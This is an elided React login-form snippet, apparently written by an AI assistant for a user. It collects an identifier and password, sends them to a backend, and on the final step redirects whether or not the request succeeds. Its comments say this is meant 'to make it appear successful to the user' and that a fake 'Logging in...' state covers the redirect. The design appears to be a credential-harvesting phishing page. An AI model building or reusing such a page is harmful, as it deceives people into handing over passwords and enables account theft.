...
export default function App() {
  ...
  const handleNext = async (e: React.FormEvent) => {
    ...
    if (step === 'IDENTIFIER') {
      ...
      // Final step: Send data to the backend!
      setIsLoading(true);
      setApiError(false);
      ...
      try {
        ...
        // We still want to redirect even if the API fails (as per user request)
        // to make it appear successful to the user.
        await response.json();
        ...
        // We keep isLoading true because we are "Logging in..." during the redirect delay
      }
    }
  };
              ...
              <form onSubmit={handleNext} className="w-full space-y-6">
                ...
                <div className="pt-4">
                  <button
                    ...
                    disabled={!password}
                    className={`px-10 py-2.5 rounded-full text-[15px] font-bold transition-all
                      ${password ? 'bg-[#00A6FF] text-white hover:bg-[#0095e6]' : 'bg-gray-100 text-gray-400 cursor-not-allowed'}`}
                  >
                    Next
                  </button>
                </div>
